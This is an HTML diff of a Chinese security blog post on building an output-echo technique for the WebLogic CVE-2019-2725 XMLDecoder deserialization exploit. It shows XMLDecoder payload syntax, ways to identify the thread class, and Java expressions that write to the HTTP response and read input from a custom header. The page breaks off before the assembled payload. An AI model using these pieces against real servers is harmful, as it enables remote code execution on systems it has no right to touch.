@@ -1,0 +1,544 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+  <meta charset="utf-8">
+  
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
+  <meta name="renderer" content="webkit">
+  <meta http-equiv="Cache-Control" content="no-transform" />
+  <meta http-equiv="Cache-Control" content="no-siteapp" />
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black">
+  <meta name="format-detection" content="telephone=no,email=no,adress=no">
+  <!-- Color theme for statusbar -->
+  <meta name="theme-color" content="#000000" />
+  <!-- 强制页面在当前窗口以独立页面显示,防止别人在框架里调用页面 -->
+  <meta http-equiv="window-target" content="_top" />
+  
+  
+  <title>weblogic-2019-2725回显构造 | lufei&#39;s blog</title>
+  <meta name="description" content="效果图10.0.3效果图 12.1.3效果图 Github地址：https:&#x2F;&#x2F;github.com&#x2F;lufeirider&#x2F;CVE-2019-2725 xmldecoderXMLEncoder 通过一个小例子来理解xmldecoder解析的xml的语法，方便后面回显exp的构造。 1234java.io.BufferedWriter out &#x3D; new java.io.BufferedWriter">
+<meta property="og:type" content="article">
+<meta property="og:title" content="weblogic-2019-2725回显构造">
+<meta property="og:url" content="https://lufe1.cn/2019/05/29/weblogic-2019-2725%E5%9B%9E%E6%98%BE%E6%9E%84%E9%80%A0/index.html">
+<meta property="og:site_name" content="lufei&#39;s blog">
+<meta property="og:description" content="效果图10.0.3效果图 12.1.3效果图 Github地址：https:&#x2F;&#x2F;github.com&#x2F;lufeirider&#x2F;CVE-2019-2725 xmldecoderXMLEncoder 通过一个小例子来理解xmldecoder解析的xml的语法，方便后面回显exp的构造。 1234java.io.BufferedWriter out &#x3D; new java.io.BufferedWriter">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://image.lufe1.cn/weblogic_2019_2725poc%E4%B8%8E%E5%9B%9E%E6%98%BE%E6%9E%84%E9%80%A0/10.0.3%E6%95%88%E6%9E%9C%E5%9B%BE.jpg">
+<meta property="og:image" content="https://image.lufe1.cn/weblogic_2019_2725poc%E4%B8%8E%E5%9B%9E%E6%98%BE%E6%9E%84%E9%80%A0/12.1.3%E6%95%88%E6%9E%9C%E5%9B%BE.jpg">
+<meta property="og:image" content="https://image.lufe1.cn/weblogic_2019_2725poc%E4%B8%8E%E5%9B%9E%E6%98%BE%E6%9E%84%E9%80%A0/1.jpg">
+<meta property="og:image" content="https://image.lufe1.cn/weblogic_2019_2725poc%E4%B8%8E%E5%9B%9E%E6%98%BE%E6%9E%84%E9%80%A0/%E7%A1%AE%E8%AE%A4%E7%BA%BF%E7%A8%8B.jpg">
+<meta property="og:image" content="https://image.lufe1.cn/weblogic_2019_2725poc%E4%B8%8E%E5%9B%9E%E6%98%BE%E6%9E%84%E9%80%A0/2.jpg">
+<meta property="og:image" content="https://image.lufe1.cn/weblogic_2019_2725poc%E4%B8%8E%E5%9B%9E%E6%98%BE%E6%9E%84%E9%80%A0/3.jpg">
+<meta property="og:image" content="https://image.lufe1.cn/weblogic_2019_2725poc%E4%B8%8E%E5%9B%9E%E6%98%BE%E6%9E%84%E9%80%A0/4.jpg">
+<meta property="og:image" content="https://image.lufe1.cn/weblogic_2019_2725poc%E4%B8%8E%E5%9B%9E%E6%98%BE%E6%9E%84%E9%80%A0/%E6%8E%A5%E5%8F%97header%E5%8F%82%E6%95%B0.jpg">
+<meta property="og:image" content="https://image.lufe1.cn/weblogic_2019_2725poc%E4%B8%8E%E5%9B%9E%E6%98%BE%E6%9E%84%E9%80%A0/WlsRequestExecutor%E8%83%BDgetResponse.jpg">
+<meta property="article:published_time" content="2019-05-28T16:00:00.000Z">
+<meta property="article:modified_time" content="2021-09-02T16:06:17.038Z">
+<meta property="article:author" content="lufei@湘ICP备17016147号-1">
+<meta property="article:tag" content="web安全">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://image.lufe1.cn/weblogic_2019_2725poc%E4%B8%8E%E5%9B%9E%E6%98%BE%E6%9E%84%E9%80%A0/10.0.3%E6%95%88%E6%9E%9C%E5%9B%BE.jpg">
+  <!-- Canonical links -->
+  <link rel="canonical" href="https://lufe1.cn/2019/05/29/weblogic-2019-2725%E5%9B%9E%E6%98%BE%E6%9E%84%E9%80%A0/index.html">
+  
+    <link rel="alternate" href="/atom.xml" title="lufei&#39;s blog" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.ico" type="image/x-icon">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+  
+  
+  
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body class="main-center" itemscope itemtype="http://schema.org/WebPage">
+  <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+  <div class="slimContent">
+    <div class="navbar-header">
+      
+      
+      <div class="profile-block text-center">
+        <a id="avatar" href="https://github.com/lufeirider" target="_blank">
+          <img class="img-circle img-rotate" src="/images/avatar.jpg" width="200" height="200">
+        </a>
+        <h2 id="name" class="hidden-xs hidden-sm">lufei</h2>
+        <h3 id="title" class="hidden-xs hidden-sm hidden-md">网络安全</h3>
+        <small id="location" class="text-muted hidden-xs hidden-sm"><i class="icon icon-map-marker"></i> Shenzhen, China</small>
+      </div>
+      
+      <div class="search" id="search-form-wrap">
+
+    <form class="search-form sidebar-form">
+        <div class="input-group">
+            <input type="text" class="search-form-input form-control" placeholder="Search" />
+            <span class="input-group-btn">
+                <button type="submit" class="search-form-submit btn btn-flat" onclick="return false;"><i class="icon icon-search"></i></button>
+            </span>
+        </div>
+    </form>
+    <div class="ins-search">
+  <div class="ins-search-mask"></div>
+  <div class="ins-search-container">
+    <div class="ins-input-wrapper">
+      <input type="text" class="ins-search-input" placeholder="Type something..." x-webkit-speech />
+      <button type="button" class="close ins-close ins-selectable" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">×</span></button>
+    </div>
+    <div class="ins-section-wrapper">
+      <div class="ins-section-container"></div>
+    </div>
+  </div>
+</div>
+
+
+</div>
+      <button class="navbar-toggle collapsed" type="button" data-toggle="collapse" data-target="#main-navbar" aria-controls="main-navbar" aria-expanded="false">
+        <span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+    </div>
+    <nav id="main-navbar" class="collapse navbar-collapse" itemscope itemtype="http://schema.org/SiteNavigationElement" role="navigation">
+      <ul class="nav navbar-nav main-nav ">
+        
+        
+        <li class="menu-item menu-item-home">
+          <a href="/.">
+            
+            <i class="icon icon-home-fill"></i>
+            
+            <span class="menu-title">Home</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives">
+            
+            <i class="icon icon-archives-fill"></i>
+            
+            <span class="menu-title">Archives</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories">
+            
+            <i class="icon icon-folder"></i>
+            
+            <span class="menu-title">Categories</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags">
+            
+            <i class="icon icon-tags"></i>
+            
+            <span class="menu-title">Tags</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-repository">
+          <a href="/repository">
+            
+            <i class="icon icon-project"></i>
+            
+            <span class="menu-title">Repository</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-books">
+          <a href="/books">
+            
+            <i class="icon icon-book-fill"></i>
+            
+            <span class="menu-title">Books</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-links">
+          <a href="/links">
+            
+            <i class="icon icon-friendship"></i>
+            
+            <span class="menu-title">Links</span>
+          </a>
+        </li>
+        
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about">
+            
+            <i class="icon icon-cup-fill"></i>
+            
+            <span class="menu-title">About</span>
+          </a>
+        </li>
+        
+      </ul>
+      
+	
+    <ul class="social-links">
+    	
+        <li><a href="https://github.com/lufeirider" target="_blank" title="Github" data-toggle=tooltip data-placement=top><i class="icon icon-github"></i></a></li>
+        
+        <li><a href="http://weibo.com/lufeirider" target="_blank" title="Weibo" data-toggle=tooltip data-placement=top><i class="icon icon-weibo"></i></a></li>
+        
+        <li><a href="https://twitter.com/lufeirider" target="_blank" title="Twitter" data-toggle=tooltip data-placement=top><i class="icon icon-twitter"></i></a></li>
+        
+        <li><a href="https://www.behance.net/lufeirider" target="_blank" title="Behance" data-toggle=tooltip data-placement=top><i class="icon icon-behance"></i></a></li>
+        
+        <li><a href="/atom.xml" target="_blank" title="Rss" data-toggle=tooltip data-placement=top><i class="icon icon-rss"></i></a></li>
+        
+    </ul>
+
+    </nav>
+  </div>
+</header>
+
+  
+    <aside class="sidebar" itemscope itemtype="http://schema.org/WPSideBar">
+  <div class="slimContent">
+    
+      <div class="widget">
+    <h3 class="widget-title">Board</h3>
+    <div class="widget-body">
+        <div id="board">
+            <div class="content">
+                <p>欢迎交流与分享经验!</p>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">Categories</h3>
+    <div class="widget-body">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/Android/">Android</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/web%E5%AE%89%E5%85%A8/">web安全</a><span class="category-list-count">14</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E4%BB%A3%E7%A0%81/">代码</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%85%8D%E6%9D%80/">免杀</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%89%8D%E7%AB%AF/">前端</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%8E%9F%E5%88%9B%E5%B7%A5%E5%85%B7/">原创工具</a><span class="category-list-count">25</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%B7%A5%E5%85%B7%E4%BF%AE%E6%94%B9/">工具修改</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/">恶意代码分析</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%8A%80%E5%B7%A7/">技巧</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%8C%96%E6%B4%9E/">挖洞</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%9D%83%E9%99%90/">权限</a><span class="category-list-count">1</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">漏洞分析</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%BD%91%E7%BB%9C/">网络</a><span class="category-list-count">2</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a><span class="category-list-count">3</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E8%84%B1%E5%A3%B3/">脱壳</a><span class="category-list-count">6</span></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E9%98%B2%E5%BE%A1/">防御</a><span class="category-list-count">1</span></li></ul>
+    </div>
+  </div>
+
+
+    
+      
+  <div class="widget">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget-body">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/Android/" rel="tag">Android</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/web%E5%AE%89%E5%85%A8/" rel="tag">web安全</a><span class="tag-list-count">14</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81/" rel="tag">代码</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%85%8D%E6%9D%80/" rel="tag">免杀</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%89%8D%E7%AB%AF/" rel="tag">前端</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%8E%9F%E5%88%9B%E5%B7%A5%E5%85%B7/" rel="tag">原创工具</a><span class="tag-list-count">25</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%B7%A5%E5%85%B7%E4%BF%AE%E6%94%B9/" rel="tag">工具修改</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90/" rel="tag">恶意代码分析</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%8A%80%E5%B7%A7/" rel="tag">技巧</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%8C%96%E6%B4%9E/" rel="tag">挖洞</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%9D%83%E9%99%90/" rel="tag">权限</a><span class="tag-list-count">1</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" rel="tag">漏洞分析</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BD%91%E7%BB%9C/" rel="tag">网络</a><span class="tag-list-count">2</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" rel="tag">网络安全</a><span class="tag-list-count">3</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E8%84%B1%E5%A3%B3/" rel="tag">脱壳</a><span class="tag-list-count">6</span></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E9%98%B2%E5%BE%A1/" rel="tag">防御</a><span class="tag-list-count">1</span></li></ul>
+    </div>
+  </div>
+
+
+    
+  </div>
+</aside>
+
+  
+  
+<main class="main" role="main">
+  <div class="content">
+  <article id="post-weblogic-2019-2725回显构造" class="article article-type-post" itemscope itemtype="http://schema.org/BlogPosting">
+    
+    <div class="article-header">
+      
+        
+  
+    <h1 class="article-title" itemprop="name">
+      weblogic-2019-2725回显构造
+    </h1>
+  
+
+      
+      <div class="article-meta">
+        <span class="article-date">
+    <i class="icon icon-calendar-check"></i>
+	<a href="/2019/05/29/weblogic-2019-2725%E5%9B%9E%E6%98%BE%E6%9E%84%E9%80%A0/" class="article-date">
+	  <time datetime="2019-05-28T16:00:00.000Z" itemprop="datePublished">2019-05-29</time>
+	</a>
+</span>
+        
+  <span class="article-category">
+    <i class="icon icon-folder"></i>
+    <a class="article-category-link" href="/categories/web%E5%AE%89%E5%85%A8/">web安全</a>
+  </span>
+
+        
+  <span class="article-tag">
+    <i class="icon icon-tags"></i>
+	<a class="article-tag-link-link" href="/tags/web%E5%AE%89%E5%85%A8/" rel="tag">web安全</a>
+  </span>
+
+
+        
+
+        <span class="post-comment"><i class="icon icon-comment"></i> <a href="/2019/05/29/weblogic-2019-2725%E5%9B%9E%E6%98%BE%E6%9E%84%E9%80%A0/#comments" class="article-comment-link">Comments</a></span>
+        
+      </div>
+    </div>
+    <div class="article-entry marked-body" itemprop="articleBody">
+      
+        <h1 id="效果图"><a href="#效果图" class="headerlink" title="效果图"></a>效果图</h1><p>10.0.3效果图<br><img src="https://image.lufe1.cn/weblogic_2019_2725poc%E4%B8%8E%E5%9B%9E%E6%98%BE%E6%9E%84%E9%80%A0/10.0.3%E6%95%88%E6%9E%9C%E5%9B%BE.jpg" alt="10.0.3效果图"></p>
+<p>12.1.3效果图<br><img src="https://image.lufe1.cn/weblogic_2019_2725poc%E4%B8%8E%E5%9B%9E%E6%98%BE%E6%9E%84%E9%80%A0/12.1.3%E6%95%88%E6%9E%9C%E5%9B%BE.jpg" alt="12.1.3效果图"></p>
+<p>Github地址：<br><a target="_blank" rel="noopener" href="https://github.com/lufeirider/CVE-2019-2725">https://github.com/lufeirider/CVE-2019-2725</a></p>
+<h1 id="xmldecoder"><a href="#xmldecoder" class="headerlink" title="xmldecoder"></a>xmldecoder</h1><p><a target="_blank" rel="noopener" href="https://docs.oracle.com/javase/9/docs/api/java/beans/XMLEncoder.html" title="Oracle">XMLEncoder</a></p>
+<p>通过一个小例子来理解xmldecoder解析的xml的语法，方便后面回显exp的构造。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">java.io.BufferedWriter out = <span class="keyword">new</span> java.io.BufferedWriter(<span class="keyword">new</span> java.io.FileWriter(<span class="string">&quot;f:/1.txt&quot;</span>));</span><br><span class="line">String className = out.getClass().toString();</span><br><span class="line">out.write(className);</span><br><span class="line">out.close();</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">object</span> <span class="attr">class</span>=<span class="string">&quot;java.io.BufferedWriter&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">object</span> <span class="attr">class</span>=<span class="string">&quot;java.io.FileWriter&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">string</span>&gt;</span>f:/2.txt<span class="tag">&lt;/<span class="name">string</span>&gt;</span><span class="tag">&lt;/<span class="name">object</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">void</span> <span class="attr">property</span>=<span class="string">&quot;class&quot;</span> <span class="attr">id</span>=<span class="string">&quot;class_property&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">object</span> <span class="attr">class</span>=<span class="string">&quot;java.io.String&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">object</span> <span class="attr">idref</span>=<span class="string">&quot;class_property&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">&quot;toString&quot;</span> <span class="attr">id</span>=<span class="string">&quot;className&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">void</span>&gt;</span><span class="tag">&lt;/<span class="name">object</span>&gt;</span><span class="tag">&lt;/<span class="name">object</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">&quot;write&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">object</span> <span class="attr">idref</span>=<span class="string">&quot;className&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">object</span>&gt;</span><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">&quot;close&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">object</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="对象初始化"><a href="#对象初始化" class="headerlink" title="对象初始化"></a>对象初始化</h2><p><code>&lt;object class=&quot;java.io.FileWriter&quot;&gt;&lt;string&gt;f:/2.txt&lt;/string&gt;&lt;/object&gt;</code>或者<code>&lt;void class=&quot;java.io.FileWriter&quot;&gt;&lt;string&gt;f:/2.txt&lt;/string&gt;&lt;/void&gt;</code>在object或void标签之中的第一标签是值，用于初始化对象。</p>
+<h2 id="无值链式调用"><a href="#无值链式调用" class="headerlink" title="无值链式调用"></a>无值链式调用</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">out.getClass().toString()</span><br><span class="line"></span><br><span class="line">&lt;<span class="keyword">void</span> method=<span class="string">&quot;getClass&quot;</span>&gt;&lt;<span class="keyword">void</span> method=<span class="string">&quot;toString&quot;</span> id=<span class="string">&quot;className&quot;</span>&gt;&lt;/<span class="keyword">void</span>&gt;&lt;/<span class="keyword">void</span>&gt;</span><br></pre></td></tr></table></figure>
+<p>既在void之中的第一标签是void。</p>
+<h2 id="有值链式调用"><a href="#有值链式调用" class="headerlink" title="有值链式调用"></a>有值链式调用</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">a.getxxx(<span class="string">&quot;xxx&quot;</span>).toString()</span><br><span class="line"></span><br><span class="line">&lt;<span class="keyword">void</span> method=<span class="string">&quot;getxxx&quot;</span>&gt;</span><br><span class="line">    &lt;string&gt;xxx&lt;/string&gt;</span><br><span class="line">    &lt;<span class="keyword">void</span> method=<span class="string">&quot;toString&quot;</span>&gt;&lt;/<span class="keyword">void</span>&gt;</span><br><span class="line">&lt;/<span class="keyword">void</span>&gt;</span><br></pre></td></tr></table></figure>
+<p>既在void之中的第一标签是值，第二个标签是void。</p>
+<h2 id="普通调用"><a href="#普通调用" class="headerlink" title="普通调用"></a>普通调用</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">out.write(className);</span><br><span class="line">out.close();</span><br><span class="line"></span><br><span class="line">&lt;<span class="keyword">void</span> method=<span class="string">&quot;write&quot;</span>&gt;&lt;object idref=<span class="string">&quot;className&quot;</span>&gt;&lt;/object&gt;&lt;/<span class="keyword">void</span>&gt;</span><br><span class="line">&lt;<span class="keyword">void</span> method=<span class="string">&quot;close&quot;</span>&gt;&lt;/<span class="keyword">void</span>&gt;</span><br></pre></td></tr></table></figure>
+<p>void属于并列关系。</p>
+<h2 id="属性"><a href="#属性" class="headerlink" title="属性"></a>属性</h2><p><code>&lt;void property=&quot;class&quot; id=&quot;class_property&quot;&gt;&lt;/void&gt;</code>,在这里获取使用<code>property</code>来获取属性，其实使用的就是getXXX()函数来获取</p>
+<h2 id="id与idref"><a href="#id与idref" class="headerlink" title="id与idref"></a>id与idref</h2><p><code>&lt;void property=&quot;class&quot; id=&quot;class_property&quot;&gt;&lt;/void&gt;</code>,这里在<code>void</code>中使用<code>id</code>进行标记，然后在<code>&lt;void method=&quot;write&quot;&gt;&lt;object idref=&quot;className&quot;&gt;&lt;/object&gt;&lt;/void&gt;</code>中使用<code>idref</code>进行引用。</p>
+<p>最后会在f盘中写入2.txt文件。</p>
+<p><img src="https://image.lufe1.cn/weblogic_2019_2725poc%E4%B8%8E%E5%9B%9E%E6%98%BE%E6%9E%84%E9%80%A0/1.jpg" alt="1" title="1"></p>
+<h1 id="回显构造"><a href="#回显构造" class="headerlink" title="回显构造"></a>回显构造</h1><p>原理：获取当前线程，然后调用函数进行显示。</p>
+<h2 id="确定线程类"><a href="#确定线程类" class="headerlink" title="确定线程类"></a>确定线程类</h2><p>weblogic封装了很多线程，无法确认获取的是哪个线程类。可以通过报错的形式获取。</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">void</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.Thread&quot;</span> <span class="attr">method</span>=<span class="string">&quot;currentThread&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">&quot;xxxxxxx&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br></pre></td></tr></table></figure>
+<p>可以获取到的线程类是<code>ExecuteThread</code>。<br><img src="https://image.lufe1.cn/weblogic_2019_2725poc%E4%B8%8E%E5%9B%9E%E6%98%BE%E6%9E%84%E9%80%A0/%E7%A1%AE%E8%AE%A4%E7%BA%BF%E7%A8%8B.jpg" alt="确认线程" title="确认线程"></p>
+<p>但是有两个<code>ExecuteThread</code>，在不同包里面，可以使用weblogic.work.ExecuteThread中特有的getDate函数，发现没有报错。说明就是<code>weblogic.work.ExecuteThread</code>。</p>
+<h2 id="确认输出类"><a href="#确认输出类" class="headerlink" title="确认输出类"></a>确认输出类</h2><p>利用ServletResponse类的getWriter，然后输出。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PrintWriter pw = response.getWriter();</span><br><span class="line">pw.write(<span class="string">&quot;hello&quot;</span>);</span><br></pre></td></tr></table></figure>
+<p>或者利用ServletResponse类的getOutputStream进行输出。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">response.getOutputStream().write(<span class="string">&quot;hello&quot;</span>.getBytes(<span class="string">&quot;UTF-8&quot;</span>));</span><br></pre></td></tr></table></figure>
+
+<p>如果没有参考输出的代码，自己要找的话，其实比较困难，因为weblogic会有很多类有getWriter、getOutputStream函数(虽然后面发现也对response搞了getResponse函数)用于各种场景，很难找到正确的类，只能通过查看类名进行初步判断进行筛选，这个过程异常痛苦。（后面发现是可以通过查看是否实现了ServletResponse接口来判断，虽然类还是很多，但是比之前直接搜索函数少不少。）</p>
+<p>而且就算找对了ServletResponseImpl，并且对getOutputStream下断点，还发现跟的是一个异步，没办法回显。（后面发现，对response下断点就可以跟踪到同步线程）</p>
+<p>因为没有更好的思路，看了shack2的工具。不过也比较痛苦，没有java的源代码，只有xml，通过大量的测试终于找到了正确的类，成功下了断点。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">server\lib\weblogic.jar!\weblogic\servlet\internal\ServletRequestImpl.class</span><br><span class="line">weblogic.servlet.internal.ServletRequestImpl</span><br><span class="line">getResponse</span><br></pre></td></tr></table></figure>
+
+<h1 id="10-0-3回显构造"><a href="#10-0-3回显构造" class="headerlink" title="10.0.3回显构造"></a>10.0.3回显构造</h1><p><img src="https://image.lufe1.cn/weblogic_2019_2725poc%E4%B8%8E%E5%9B%9E%E6%98%BE%E6%9E%84%E9%80%A0/2.jpg" alt="2" title="2"></p>
+<p><code>((ServletRequestImpl) this.getCurrentWork()).getResponse().getWriter().write(&quot;xxxxxxx&quot;)</code>，就会在返回包中看到返回xxxxxxx。</p>
+<p>但是这样会存在问题，会提示。<br><img src="https://image.lufe1.cn/weblogic_2019_2725poc%E4%B8%8E%E5%9B%9E%E6%98%BE%E6%9E%84%E9%80%A0/3.jpg" alt="3" title="3"></p>
+<p>原因是getOutputStream是字节流，getWriter是字符流，不统一，java源码提示的是，不能在getWriter后面调用getOutputStream。在谷歌过程中还产生一个疑问，说只能使用其中一种流。很奇怪，在构造回显的时候，先使用getOutputStream，再使用getWriter也是没问题的。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">((ServletRequestImpl) <span class="keyword">this</span>.getCurrentWork()).getResponse().getServletOutputStream().writeStream(<span class="keyword">new</span> StringInputStream(<span class="string">&quot;xxxx&quot;</span>))</span><br><span class="line">((ServletRequestImpl) <span class="keyword">this</span>.getCurrentWork()).getResponse().getServletOutputStream().flush()</span><br></pre></td></tr></table></figure>
+
+<p>所以这里使用getOutputStream进行输出，虽然显示了结果，但是还是有其他的东西。<br><img src="https://image.lufe1.cn/weblogic_2019_2725poc%E4%B8%8E%E5%9B%9E%E6%98%BE%E6%9E%84%E9%80%A0/4.jpg" alt="4" title="4"></p>
+<p>只要执行下面的东西，就会把结果覆盖掉为空。两种流是互相拼接起来。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">((ServletRequestImpl) <span class="keyword">this</span>.getCurrentWork()).getResponse().getWriter().write(<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>再者要解决接受参数的问题，这个比较简单，因为接受参数就在返回函数的附近。从header头lufei接受参数。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">((weblogic.servlet.internal.ServletRequestImpl)((weblogic.work.ExecuteThread)Thread.currentThread()).getCurrentWork()).getHeader(<span class="string">&quot;lufei&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>整合起来</p>
